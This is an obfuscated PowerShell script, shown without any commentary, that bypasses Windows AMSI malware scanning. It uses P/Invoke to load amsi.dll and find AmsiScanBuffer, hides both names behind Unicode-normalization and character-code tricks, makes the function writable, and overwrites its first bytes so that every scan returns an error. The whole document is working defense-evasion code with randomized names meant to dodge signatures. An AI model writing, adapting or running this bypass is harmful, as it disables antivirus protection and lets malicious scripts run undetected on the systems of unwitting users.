$Nmn3kaFUu = @"
using System;
using System.Runtime.InteropServices;
public class Nmn3kaFUu {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr lvjqsq32X5gTA2, string e_g);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr fwVOetFIM4q, UIntPtr efuqGrFgb29, uint jORZ4i02hG, out uint bUHMT4ptAtAJeBtrVY9);
}
"@

Add-Type $Nmn3kaFUu

$hi4K8LZOqeYYQUSgSVn = [Nmn3kaFUu]::LoadLibrary("$(('àmsí'+'.dll').nOrMalIZe([char]([ByTe]0x46)+[char]([BytE]0x6f)+[chAR]([Byte]0x72)+[ChAr]([bYte]0x6d)+[cHAr](68+38-38)) -replace [chaR]([bYte]0x5c)+[cHar](112)+[CHAR](123+109-109)+[char](77+39-39)+[ChAR]([ByTE]0x6e)+[chAr]([BYTe]0x7d))")
$PnCv4pY0Lo8LHamV = [Nmn3kaFUu]::GetProcAddress($hi4K8LZOqeYYQUSgSVn, "$(('ÄmsîScá'+'nBûffér').NorMaLIze([Char](70*16/16)+[CHaR]([byTE]0x6f)+[chAR]([BytE]0x72)+[ChAR](109+26-26)+[CHAr]([BYTe]0x44)) -replace [CHar]([BYtE]0x5c)+[cHAr]([byTE]0x70)+[ChAr](117+6)+[CHAR]([Byte]0x4d)+[cHAR]([BYTE]0x6e)+[ChAr](125))")
$p = 0
[Nmn3kaFUu]::VirtualProtect($PnCv4pY0Lo8LHamV, [uint32]5, 0x40, [ref]$p)
$Ruj4 = "0xB8"
$fVNV6NLy3GSVeI = "0x57"
$h1jvP7czKP = "0x00"
$HPzH5WtEE = "0x07"
$VWm1U4MbzDhBV = "0x80"
$smFw80smM = "0xC3"
$yEC = [Byte[]] ($Ruj4,$fVNV6NLy3GSVeI,$h1jvP7czKP,$HPzH5WtEE,+$VWm1U4MbzDhBV,+$smFw80smM)
[System.Runtime.InteropServices.Marshal]::Copy($yEC, 0, $PnCv4pY0Lo8LHamV, 6)